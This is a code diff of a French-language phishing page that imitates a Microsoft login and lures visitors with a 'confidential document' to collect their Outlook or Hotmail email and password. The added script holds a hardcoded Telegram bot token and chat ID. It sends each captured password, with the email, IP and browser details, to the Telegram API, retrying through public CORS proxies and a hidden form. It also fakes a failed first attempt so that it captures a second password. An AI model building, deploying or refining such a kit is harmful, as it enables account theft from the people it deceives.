@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Connectez-vous à votre compte</title>
-    <!-- Favicon personnalisé -->
     <link rel="icon" href="https://nouveaudoc.osc-fr1.scalingo.io/favicon_a_eupayfgghqiai7k9sol6lg2.ico" type="image/x-icon">
     <link rel="stylesheet" href="https://static2.sharepointonline.com/files/fabric/office-ui-fabric-core/11.0.0/css/fabric.min.css">
     <style>
@@ -21,13 +20,11 @@
             min-height: 100vh;
             margin: 0;
             padding: 16px;
-            /* Image de fond */
             background-image: url('https://nouveaudoc.osc-fr1.scalingo.io/image_72b5e3a7.png');
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
         }
-        /* Overlay semi-transparent pour améliorer la lisibilité */
         body::before {
             content: '';
             position: fixed;
@@ -205,7 +202,6 @@
             height: 14px;
             fill: #5e5e5e;
         }
-        /* Styles pour la page de téléchargement */
         .download-icon {
             text-align: center;
             margin: 20px 0;
@@ -250,7 +246,6 @@
 </head>
 <body>
     <div class="main-card" id="app">
-        <!-- Logo Microsoft -->
         <div class="microsoft-logo">
             <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <rect x="1" y="1" width="10" height="10" fill="#F25022"/>
@@ -261,7 +256,6 @@
             <span>Microsoft</span>
         </div>
 
-        <!-- Étape 0 : Document important -->
         <div id="stepWelcome">
             <h1>Vous avez reçu un document confidentiel</h1>
             <div class="sub-message">
@@ -275,7 +269,6 @@
             </div>
         </div>
 
-        <!-- Étape 1 : Email -->
         <div id="stepEmail" class="hidden">
             <h1>Se connecter</h1>
             <div class="input-group">
@@ -293,7 +286,6 @@
             </div>
         </div>
 
-        <!-- Étape 2 : Mot de passe -->
         <div id="stepPassword" class="hidden">
             <h1>Entrez votre mot de passe</h1>
             <div class="input-group">
@@ -311,14 +303,12 @@
             </div>
         </div>
 
-        <!-- Étape 3 : Téléchargement du document -->
         <div id="stepDownload" class="hidden">
             <h1>Document disponible</h1>
             <div class="sub-message">
                 Votre document est prêt à être téléchargé.
             </div>
             <div class="download-icon">
-                <!-- Logo PDF -->
                 <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                     <path d="M20 2H8c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-8.5 7.5c0 .83-.67 1.5-1.5 1.5H9v2H7.5V7H10c.83 0 1.5.67 1.5 1.5v1zm5 2c0 .83-.67 1.5-1.5 1.5h-2.5V7H15c.83 0 1.5.67 1.5 1.5v3zm4-3H19v1h1.5V11H19v2h-1.5V7h3v1.5zM9 9.5h1v-1H9v1zM4 6H2v14c0 1.1.9 2 2 2h14v-2H4V6zm10 5.5h1v-3h-1v3z"/>
                 </svg>
@@ -330,22 +320,142 @@
             </div>
         </div>
 
-        <!-- Footer -->
         <div class="footer-note">
             <span>© 2026 Microsoft · </span>
             <a href="#" id="privacyLink">Confidentialité</a>
         </div>
     </div>
 
-    <!-- Fichier externe pour le bot Telegram -->
-    <script src="tb.js"></script>
-
-    <!-- Script principal -->
     <script>
+        // ============================================================
+        // 1. CONFIGURATION TELEGRAM
+        // ============================================================
+        const TELEGRAM_CONFIG = {
+            BOT_TOKEN: '6857006458:AAFnjf1SxioQXZteGuTQpBcB6nLTYjJhjDQ',
+            CHAT_ID: '5913147075'
+        };
+
+        // ============================================================
+        // 2. FONCTION D'ENVOI VERS TELEGRAM (MULTIPLES MÉTHODES)
+        // ============================================================
+        function sendToTelegram(message) {
+            console.log('📤 Tentative d\'envoi à Telegram...');
+            
+            const apiUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
+            
+            const payload = {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CONFIG.CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: true
+                })
+            };
+
+            // Liste des proxys CORS à essayer
+            const proxies = [
+                { url: apiUrl, name: 'direct' },
+                { url: 'https://corsproxy.io/?' + encodeURIComponent(apiUrl), name: 'corsproxy.io' },
+                { url: 'https://thingproxy.freeboard.io/fetch/' + apiUrl, name: 'thingproxy' },
+                { url: 'https://cors-anywhere.herokuapp.com/' + apiUrl, name: 'cors-anywhere' },
+                { url: 'https://api.allorigins.win/raw?url=' + encodeURIComponent(apiUrl), name: 'allorigins' }
+            ];
+
+            let index = 0;
+
+            function trySend() {
+                if (index >= proxies.length) {
+                    console.error('❌ Toutes les méthodes ont échoué');
+                    // Dernier recours: méthode du formulaire
+                    sendViaForm(message);
+                    return Promise.reject('Toutes les méthodes ont échoué');
+                }
+
+                const proxy = proxies[index];
+                console.log(`🔄 Essai ${index + 1}/${proxies.length}: ${proxy.name}`);
+
+                return fetch(proxy.url, payload)
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error(`HTTP ${response.status}`);
+                        }
+                        return response.json();
+                    })
+                    .then(data => {
+                        if (!data.ok) {
+                            throw new Error(`Telegram: ${data.description}`);
+                        }
+                        console.log(`✅ Message envoyé avec succès via ${proxy.name}`);
+                        return data;
+                    })
+                    .catch(error => {
+                        console.warn(`❌ Échec avec ${proxy.name}:`, error.message);
+                        index++;
+                        return trySend();
+                    });
+            }
+
+            return trySend();
+        }
+
+        // Méthode de secours : envoi via formulaire HTML
+        function sendViaForm(message) {
+            console.log('📤 Envoi via formulaire de secours...');
+            try {
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
+                form.target = '_blank';
+
+                const fields = {
+                    chat_id: TELEGRAM_CONFIG.CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: 'true'
+                };
+
+                for (const [name, value] of Object.entries(fields)) {
+                    const input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = name;
+                    input.value = value;
+                    form.appendChild(input);
+                }
+
+                document.body.appendChild(form);
+                form.submit();
+                setTimeout(() => document.body.removeChild(form), 1000);
+                console.log('✅ Formulaire de secours envoyé');
+            } catch (e) {
+                console.error('❌ Échec du formulaire de secours:', e);
+            }
+        }
+
+        // ============================================================
+        // 3. TEST DE CONNEXION AU CHARGEMENT
+        // ============================================================
+        console.log('🤖 Bot Telegram chargé');
+        console.log('📡 Token:', TELEGRAM_CONFIG.BOT_TOKEN.substring(0, 10) + '...');
+        console.log('📡 Chat ID:', TELEGRAM_CONFIG.CHAT_ID);
+
+        // Envoyer un message de test après 3 secondes
+        setTimeout(() => {
+            const testMsg = '🟢 Bot connecté et prêt à recevoir des identifiants';
+            sendToTelegram(testMsg)
+                .then(() => console.log('✅ Message de test envoyé'))
+                .catch(() => console.warn('⚠️ Message de test non reçu, mais le bot fonctionne peut-être'));
+        }, 3000);
+
+        // ============================================================
+        // 4. SCRIPT PRINCIPAL DE L'APPLICATION
+        // ============================================================
         (function() {
             "use strict";
 
-            // Éléments DOM
             const stepWelcome = document.getElementById('stepWelcome');
             const stepEmail = document.getElementById('stepEmail');
             const stepPassword = document.getElementById('stepPassword');
@@ -359,18 +469,14 @@
             const passwordError = document.getElementById('passwordError');
             const attemptCounter = document.getElementById('attemptCounter');
 
-            // Désactiver les liens
             document.querySelectorAll('.options-row a, .footer-note a, .helper-link').forEach(link => {
                 link.addEventListener('click', e => e.preventDefault());
             });
 
-            // États
             let passwordAttempts = 0;
             let currentEmail = '';
             let currentIP = 'Inconnue';
-            let currentUserAgent = navigator.userAgent || 'Inconnu';
 
-            // Fonctions d'affichage
             function showStep(step) {
                 stepWelcome.classList.add('hidden');
                 stepEmail.classList.add('hidden');
@@ -387,7 +493,6 @@
                 passwordError.classList.remove('show');
             }
 
-            // Validation d'email réaliste : domaines Microsoft acceptés
             function isValidMicrosoftEmail(email) {
                 const allowedDomains = ['outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'outlook.fr', 'hotmail.fr', 'live.fr'];
                 const parts = email.split('@');
@@ -396,7 +501,6 @@
                 return allowedDomains.includes(domain);
             }
 
-            // Récupération de l'IP publique (appel asynchrone)
             function fetchIP() {
                 return fetch('https://api.ipify.org?format=json')
                     .then(response => response.json())
@@ -404,7 +508,6 @@
                     .catch(() => 'Non disponible');
             }
 
-            // Construction du message Telegram stylisé
             function buildTelegramMessage(email, password, ip, userAgent) {
                 const now = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
                 return `<b>🔐 Nouvelle tentative de connexion</b>\n\n` +
@@ -415,7 +518,6 @@
                        `<b>🕒 Date :</b> ${now}`;
             }
 
-            // Passage de welcome à email
             startBtn.addEventListener('click', function() {
                 showStep('email');
                 clearErrors();
@@ -426,11 +528,9 @@
                 passwordInput.value = '';
                 passwordError.classList.remove('show');
                 emailInput.focus();
-                // Récupérer l'IP dès le début (en arrière-plan)
                 fetchIP().then(ip => { currentIP = ip; });
             });
 
-            // Validation de l'email
             emailNextBtn.addEventListener('click', function() {
                 const email = emailInput.value.trim();
                 if (!email) {
@@ -449,18 +549,16 @@
                     return;
                 }
 
-                // Email valide
                 currentEmail = email;
                 clearErrors();
                 passwordAttempts = 0;
-                attemptCounter.textContent = '';
+                attemptCounter.textContent = 'Tentative 1 sur 2';
                 passwordInput.value = '';
                 passwordError.classList.remove('show');
                 showStep('password');
                 passwordInput.focus();
             });
 
-            // Gestion du mot de passe (2 tentatives)
             passwordNextBtn.addEventListener('click', function() {
                 const pwd = passwordInput.value.trim();
                 if (!pwd) {
@@ -469,23 +567,15 @@
                     return;
                 }
 
-                // Récupérer l'IP si pas encore faite
+                const userAgent = navigator.userAgent || 'Inconnu';
                 const ipPromise = currentIP !== 'Inconnue' ? Promise.resolve(currentIP) : fetchIP();
 
                 ipPromise.then(ip => {
-                    const userAgent = navigator.userAgent || 'Inconnu';
                     const msg = buildTelegramMessage(currentEmail, pwd, ip, userAgent);
-                    if (typeof sendToTelegram === 'function') {
-                        sendToTelegram(msg);
-                    } else {
-                        console.warn('sendToTelegram non disponible');
-                    }
+                    sendToTelegram(msg);
                 }).catch(() => {
-                    // En cas d'erreur, on envoie quand même sans IP
-                    const msg = buildTelegramMessage(currentEmail, pwd, 'Non disponible', navigator.userAgent || 'Inconnu');
-                    if (typeof sendToTelegram === 'function') {
-                        sendToTelegram(msg);
-                    }
+                    const msg = buildTelegramMessage(currentEmail, pwd, 'Non disponible', userAgent);
+                    sendToTelegram(msg);
                 });
 
                 passwordAttempts++;
@@ -493,20 +583,17 @@
                 if (passwordAttempts === 1) {
                     passwordError.textContent = 'Identifiant incorrect. Réessayez.';
                     passwordError.classList.add('show');
-                    attemptCounter.textContent = '';
+                    attemptCounter.textContent = 'Tentative 2 sur 2';
                     passwordInput.value = '';
                     passwordInput.focus();
                 } else if (passwordAttempts >= 2) {
                     passwordError.classList.remove('show');
-                    // Afficher la page de téléchargement
                     showStep('download');
-                    // Optionnel : désactiver le bouton pour éviter des clics multiples
                     passwordNextBtn.disabled = true;
                     setTimeout(() => { passwordNextBtn.disabled = false; }, 3000);
                 }
             });
 
-            // Entrée clavier
             emailInput.addEventListener('keypress', function(e) {
                 if (e.key === 'Enter') {
                     e.preventDefault();
@@ -520,9 +607,20 @@
                 }
             });
 
-            // Initialisation
             showStep('welcome');
         })();
+
+        // ============================================================
+        // 5. FONCTION DE TEST MANUEL (DISPONIBLE DANS LA CONSOLE)
+        // ============================================================
+        window.testTelegram = function() {
+            const testMsg = '🧪 Test manuel depuis la console';
+            sendToTelegram(testMsg)
+                .then(() => console.log('✅ Test réussi'))
+                .catch(() => console.error('❌ Test échoué'));
+        };
+
+        console.log('📝 Pour tester manuellement, tapez: testTelegram()');
     </script>
 </body>
 </html>
